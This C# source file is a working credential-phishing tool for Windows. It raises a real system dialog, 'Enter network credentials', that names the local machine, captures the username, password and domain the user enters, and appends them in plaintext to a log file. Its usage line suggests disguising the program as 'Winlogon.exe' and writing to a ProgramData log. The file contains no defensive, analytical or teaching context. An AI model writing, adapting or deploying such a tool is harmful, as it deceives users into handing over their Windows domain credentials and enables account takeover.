using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace program
{
    class Auth
    {
        // stolen from http://stackoverflow.com/questions/4134882/show-authentication-dialog-in-c-sharp-for-windows-vista-7
        [DllImport("ole32.dll")]
        private static extern void CoTaskMemFree(IntPtr ptr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }


        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
                                                                   IntPtr pAuthBuffer,
                                                                   uint cbAuthBuffer,
                                                                   StringBuilder pszUserName,
                                                                   ref int pcchMaxUserName,
                                                                   StringBuilder pszDomainName,
                                                                   ref int pcchMaxDomainame,
                                                                   StringBuilder pszPassword,
                                                                   ref int pcchMaxPassword);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
                                                                     int authError,
                                                                     ref uint authPackage,
                                                                     IntPtr InAuthBuffer,
                                                                     uint InAuthBufferSize,
                                                                     out IntPtr refOutAuthBuffer,
                                                                     out uint refOutAuthBufferSize,
                                                                     ref bool fSave,
                                                                     int flags);



        public static void GetCredentialsVistaAndUp( out NetworkCredential networkCredential)
        {
            CREDUI_INFO credui = new CREDUI_INFO();
            credui.pszCaptionText = "Enter network credentials";
            credui.pszMessageText = $"Enter your credentials to conenect to: {Environment.MachineName}";
            credui.cbSize = Marshal.SizeOf(credui);
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;
            int result = CredUIPromptForWindowsCredentials(ref credui,
                                                           0,
                                                           ref authPackage,
                                                           IntPtr.Zero,
                                                           0,
                                                           out outCredBuffer,
                                                           out outCredSize,
                                                           ref save,
                                                           0x10 /* Generic */);

            var usernameBuf = new StringBuilder(100);
            var passwordBuf = new StringBuilder(100);
            var domainBuf = new StringBuilder(100);

            int maxUserName = 100;
            int maxDomain = 100;
            int maxPassword = 100;
            if (result == 0)
            {
                if (CredUnPackAuthenticationBuffer(1, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                                                   domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {


                    //clear the memory allocated by CredUIPromptForWindowsCredentials 
                    CoTaskMemFree(outCredBuffer);
                    networkCredential = new NetworkCredential()
                    {
                        UserName = usernameBuf.ToString(),
                        Password = passwordBuf.ToString(),
                        Domain = domainBuf.ToString()

                    };
                    return;
                }
            }

            networkCredential = null;
        }
        static void Main(string[] args)
        {
            string defpath = "";
            if (args.Length == 1)
            {
                defpath = args[0];

            }
            else
            {
                Console.WriteLine(@"Use: Winlogon.exe c:\programdata\log.log");
                Environment.Exit(1);
            }
          
            try
            {
                NetworkCredential nc = new NetworkCredential();
                Auth.GetCredentialsVistaAndUp(out nc);
                if (nc != null)
                {
                    var data = $"user:{nc.UserName} pass:{nc.Password} domain:{nc.Domain}";
                    using (StreamWriter sw = new StreamWriter(defpath, true))
                    {
                        sw.WriteLine(data);
                    }
                }
            }
            catch (Exception)
            {
                Environment.Exit(1);
            }
        }
    }
}